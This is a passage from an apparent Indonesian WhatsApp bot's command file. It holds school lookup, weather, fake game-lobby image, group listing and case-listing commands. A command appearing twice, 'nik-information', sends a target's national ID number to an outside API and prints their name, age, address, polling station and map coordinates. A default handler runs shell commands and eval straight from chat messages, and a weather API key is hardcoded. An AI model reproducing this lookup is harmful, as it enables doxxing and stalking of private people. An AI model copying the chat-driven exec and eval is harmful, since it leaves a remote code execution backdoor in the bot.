 `https://api-sekolah-indonesia.vercel.app/sekolah?s=${encodeURIComponent(namaSekolah)}&kab=${encodeURIComponent(daerah)}`,
 `https://data.sekolah-kita.net/sekolah/${encodeURIComponent(namaSekolah)}/${encodeURIComponent(daerah)}`,
 `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://dapo.kemdikbud.go.id/api/search?q=${namaSekolah}&kab=${daerah}`)}`
 ];

 let schoolData = null;
 let apiUsed = "";

 for (const apiUrl of apis) {
 try {
 const response = await fetch(apiUrl, {
 headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
 timeout: 10000
 });

 if (response.ok) {
 const data = await response.json();
 
 if (data && (data.data || data.sekolah || data.result)) {
 schoolData = data.data || data.sekolah || data.result;
 apiUsed = apiUrl.includes('vercel.app') ? "API Sekolah Indonesia" : 
 apiUrl.includes('sekolah-kita') ? "Sekolah Kita" : "Dapodik Kemdikbud";
 break;
 }
 }
 } catch (error) {
 continue;
 }
 }

 if (!schoolData || (Array.isArray(schoolData) && schoolData.length === 0)) {
 await depayy.sendMessage(m.chat, {
 edit: statusMsg.key,
 text: `❌ Data tidak ditemukan untuk "${namaSekolah}" di ${daerah}`
 });
 return;
 }

 const sekolah = Array.isArray(schoolData) ? schoolData[0] : schoolData;
 
 let info = `🏫 *DATA SEKOLAH TERVERIFIKASI*\n\n`;
 info += `📛 *Nama:* ${sekolah.nama_sekolah || sekolah.nama || 'Tidak tersedia'}\n`;
 info += `🆔 *NPSN:* ${sekolah.npsn || 'Tidak tersedia'}\n`;
 info += `📍 *Alamat:* ${sekolah.alamat || sekolah.alamat_jalan || 'Tidak tersedia'}\n`;
 info += `🏙️ *Kecamatan:* ${sekolah.kecamatan || 'Tidak tersedia'}\n`;
 info += `🌆 *Kabupaten/Kota:* ${sekolah.kabupaten || sekolah.kab || daerah}\n`;
 info += `📍 *Provinsi:* ${sekolah.provinsi || 'Tidak tersedia'}\n`;
 info += `📞 *Telepon:* ${sekolah.telepon || sekolah.no_telp || 'Tidak tersedia'}\n`;
 info += `📧 *Email:* ${sekolah.email || 'Tidak tersedia'}\n`;
 info += `🌐 *Website:* ${sekolah.website || 'Tidak tersedia'}\n`;
 info += `🏛️ *Status:* ${sekolah.status_sekolah || sekolah.status || 'Tidak tersedia'}\n`;
 info += `📊 *Jenjang:* ${sekolah.jenjang_pendidikan || sekolah.bentuk_pendidikan || 'Tidak tersedia'}\n\n`;
 
 if (sekolah.akreditasi) {
 info += `⭐ *Akreditasi:* ${sekolah.akreditasi}\n`;
 }
 
 if (sekolah.latitude && sekolah.longitude) {
 info += `🗺️ *Koordinat:* ${sekolah.latitude}, ${sekolah.longitude}\n`;
 }
 
 info += `\n📡 *Sumber:* ${apiUsed}\n`;
 info += `🔍 *Pencarian:* ${namaSekolah} | ${daerah}\n`;
 info += `⏰ *Update:* ${new Date().toLocaleDateString('id-ID')}`;

 const mapUrl = sekolah.latitude && sekolah.longitude 
 ? `https://maps.google.com/maps?q=${sekolah.latitude},${sekolah.longitude}&z=17&hl=id`
 : `https://maps.google.com/maps?q=${encodeURIComponent(sekolah.alamat + ', ' + daerah)}&hl=id`;

 await depayy.sendMessage(m.chat, {
 edit: statusMsg.key,
 text: info,
 contextInfo: {
 externalAdReply: {
 title: `🏫 ${sekolah.nama_sekolah || sekolah.nama || 'Sekolah'}`,
 body: `📍 ${sekolah.kabupaten || daerah} | 🆔 ${sekolah.npsn || 'NPSN'}`,
 mediaType: 1,
 thumbnail: await (await fetch('https://api.dicebear.com/7.x/shapes/png?seed=school')).buffer(),
 mediaUrl: mapUrl,
 sourceUrl: mapUrl
 }
 }
 });

 if (Array.isArray(schoolData) && schoolData.length > 1) {
 setTimeout(async () => {
 await payreply(`📚 Ditemukan ${schoolData.length} sekolah serupa. Gunakan filter lebih spesifik untuk hasil tepat.`);
 }, 1000);
 }
}

break;

case 'nik-information': {
 if (!isPremium)
 return payreply("𝐒𝐎𝐑𝐑𝐘 𝐋𝐔 𝐉𝐄𝐋𝐄𝐊 𝐉𝐀𝐃𝐈 𝐆𝐀 𝐃𝐀𝐏𝐄𝐓 𝐀𝐊𝐒𝐄𝐒");

 if (!q)
 return payreply(
 "📌 Masukkan NIK target!\n\nContoh:\n.nik-perse 3202285909840005"
 );

 const nik = q.trim();

 try {
 payreply("🔍 Sedang Mencari Data Dari NIK Tersebut");

 const res = await fetch("https://api.siputzx.my.id/api/tools/nik-checker", {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ nik })
 });

 const json = await res.json();

 if (!json.status || !json.data?.data) {
 return payreply("❌ NIK tidak valid atau data tidak ditemukan.");
 }

 const d = json.data.data;
 const coord = d.koordinat || {};

 const hasil = `
📑 𝐃𝐀𝐓𝐀

• NIK: ${json.data.nik || nik}
• Nama: ${d.nama || "-"}
• Jenis Kelamin: ${d.kelamin || "-"}
• Tempat Lahir: ${d.tempat_lahir || "-"}
• Usia: ${d.usia || "-"}
• Zodiak: ${d.zodiak || "-"}
• Ultah Mendatang: ${d.ultah_mendatang || "-"}
• Pasaran: ${d.pasaran || "-"}

🏠 *Alamat*
• Provinsi: ${d.provinsi || "-"}
• Kabupaten: ${d.kabupaten || "-"}
• Kecamatan: ${d.kecamatan || "-"}
• Kelurahan: ${d.kelurahan || "-"}
• TPS: ${d.tps || "-"}
• Detail: ${d.alamat || "-"}

📍 *Koordinat*
• Latitude: ${coord.lat || "-"}
• Longitude: ${coord.lon || "-"}
${coord.lat && coord.lon
 ? `• Maps: https://www.google.com/maps/search/?api=1&query=${coord.lat},${coord.lon}`
 : ""}

 `.trim();

 payreply(hasil);

 } catch (err) {
 console.error("NIK PERSE ERROR:", err);
 payreply("❌ Gagal memproses NIK");
 }
}

break;

case 'nik-information': {
 if (!isCreator)
 return payreply("𝐒𝐎𝐑𝐑𝐘 𝐋𝐔 𝐉𝐄𝐋𝐄𝐊 𝐉𝐀𝐃𝐈 𝐆𝐀 𝐃𝐀𝐏𝐄𝐓 𝐀𝐊𝐒𝐄𝐒");

 if (!q)
 return payreply(
 "📌 Masukkan NIK target!\n\nContoh:\n.nik-perse 3202285909840005"
 );

 const nik = q.trim();

 try {
 payreply("🔍 Sedang Mencari Data Dari NIK Tersebut");

 const res = await fetch("https://api.siputzx.my.id/api/tools/nik-checker", {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ nik })
 });

 const json = await res.json();

 if (!json.status || !json.data?.data) {
 return payreply("❌ NIK tidak valid atau data tidak ditemukan.");
 }

 const d = json.data.data;
 const coord = d.koordinat || {};

 const hasil = `
📑 𝐃𝐀𝐓𝐀

• NIK: ${json.data.nik || nik}
• Nama: ${d.nama || "-"}
• Jenis Kelamin: ${d.kelamin || "-"}
• Tempat Lahir: ${d.tempat_lahir || "-"}
• Usia: ${d.usia || "-"}
• Zodiak: ${d.zodiak || "-"}
• Ultah Mendatang: ${d.ultah_mendatang || "-"}
• Pasaran: ${d.pasaran || "-"}

🏠 *Alamat*
• Provinsi: ${d.provinsi || "-"}
• Kabupaten: ${d.kabupaten || "-"}
• Kecamatan: ${d.kecamatan || "-"}
• Kelurahan: ${d.kelurahan || "-"}
• TPS: ${d.tps || "-"}
• Detail: ${d.alamat || "-"}

📍 *Koordinat*
• Latitude: ${coord.lat || "-"}
• Longitude: ${coord.lon || "-"}
${coord.lat && coord.lon
 ? `• Maps: https://www.google.com/maps/search/?api=1&query=${coord.lat},${coord.lon}`
 : ""}

 `.trim();

 payreply(hasil);

 } catch (err) {
 console.error("NIK PERSE ERROR:", err);
 payreply("❌ Gagal memproses NIK");
 }
}

break;

case 'cuaca': case 'cekcuaca': {
				if (!text) return payreply(`Example: ${prefix + command} jakarta`)
				try {
					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
					payreply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
				} catch (e) {
					payreply('Kota Tidak Di Temukan!')
				}
			}
			break





;

;















case "fakelobyml": {
 if (!m.quoted) return payreply("Reply foto!")

 const nama = text.trim()
 if (!nama) return payreply(`Contoh: ${prefix + command} KenShii`)

 try {
 const { createCanvas, loadImage } = require("canvas")
 const path = require("path")

 const media = await depayy.downloadMediaMessage(m.quoted)

 const bg = await loadImage(
 path.join(__dirname, "image", "lobbyml.jpg")
 )

 const avatar = await loadImage(media)

 const canvas = createCanvas(bg.width, bg.height)
 const ctx = canvas.getContext("2d")

 // Background
 ctx.drawImage(bg, 0, 0, bg.width, bg.height)

 // ======================
 // Avatar Profile
 // ======================
 const avatarX = 378
 const avatarY = 208
 const avatarSize = 145

 ctx.save()
 ctx.beginPath()
 ctx.roundRect(
 avatarX,
 avatarY,
 avatarSize,
 avatarSize,
 12
 )
 ctx.clip()

 ctx.drawImage(
 avatar,
 avatarX,
 avatarY,
 avatarSize,
 avatarSize
 )

 ctx.restore()

 // ======================
 // Username
 // ======================
 const nameX = 525
 const nameY = 620

 ctx.textAlign = "center"
 ctx.textBaseline = "middle"
 ctx.font = "bold 34px Sans"

 ctx.strokeStyle = "#2b1808"
 ctx.lineWidth = 6
 ctx.strokeText(nama, nameX, nameY)

 ctx.fillStyle = "#ffd36b"
 ctx.fillText(nama, nameX, nameY)

 // ======================
 // Hasil
 // ======================
 const result = canvas.toBuffer("image/png")

 await depayy.sendMessage(
 m.chat,
 {
 image: result,
 caption: `🎮 *Fake Lobby ML*\n👤 *Nickname:* ${nama}`
 },
 { quoted: m }
 )

 } catch (err) {
 console.error(err)
 payreply(`❌ Error: ${err.message}`)
 }
}
break

case 'listgrub': {
 if (!isCreator) return payreply('Fitur khusus owner bot!')

 let groups = await depayy.groupFetchAllParticipating()
 let anu = Object.values(groups)

 let teks = `*LIST SEMUA GRUP BOT*\n`
 teks += `*Total Grup:* ${anu.length}\n\n`

 for (let i of anu) {
 let admins = i.participants.filter(v => v.admin)
 let owner = i.owner || admins[0]?.id || '-'

 teks += `╭─「 ${i.subject} 」\n`
 teks += `│ 👥 Member : ${i.participants.length}\n`
 teks += `│ 👑 Admin : ${admins.length}\n`
 teks += `│ 🔱 Owner : ${owner.split('@')[0]}\n`
 teks += `│ 📅 Dibuat : ${new Date(i.creation * 1000).toLocaleString('id-ID')}\n`
 teks += `│ 🆔 ID : ${i.id}\n`
 teks += `╰───────────────\n\n`
 }

 await payreply(teks)
}
break

case "swgb2": {
    if (!isCreator) return payreply("Khusus owner!")

    const quoted = m.quoted ? m.quoted : m

    global.swgb2 ??= {}
    global.swgb2[m.sender] = {
        quoted,
        caption: text || ""
    }

    let groups = Object.values(await depayy.groupFetchAllParticipating())

    let rows = groups.map(gc => ({
        title: gc.subject,
        description: `${gc.participants.length} member`,
        id: gc.id
    }))

    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Pilih grup tujuan status"
                    },
                    footer: {
                        text: global.botname
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "📂 Pilih Grup",
                                sections: [{
                                    title: "LIST GROUP",
                                    rows
                                }]
                            })
                        }]
                    }
                }
            }
        }
    }

    await depayy.relayMessage(m.chat, msg, {})
}
break

case "listcase": {
    if (!isCreator) return payreply("Khusus owner!")

    const fs = require("fs")
    const source = fs.readFileSync("./case.js", "utf8")

    const matches = [
        ...source.matchAll(/case\s+["'`](.*?)["'`]\s*:/g)
    ]

    const cases = [...new Set(matches.map(v => v[1]))]

    let rows = cases.map(v => ({
        title: v,
        description: `Lihat source case ${v}`,
        id: `.getcase ${v}`
    }))

    let msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: `Total ${cases.length} case ditemukan`
                    },
                    footer: {
                        text: global.botname
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "📂 LIST CASE",
                                sections: [{
                                    title: "SEMUA CASE",
                                    rows
                                }]
                            })
                        }]
                    }
                }
            }
        }
    }

    await depayy.relayMessage(m.chat, msg, {})
}
break



// END TOD
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return payreply(err)
                        if (stdout) return payreply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await payeply(evaled);
                    } catch (err) {
                        payreply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await payreply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})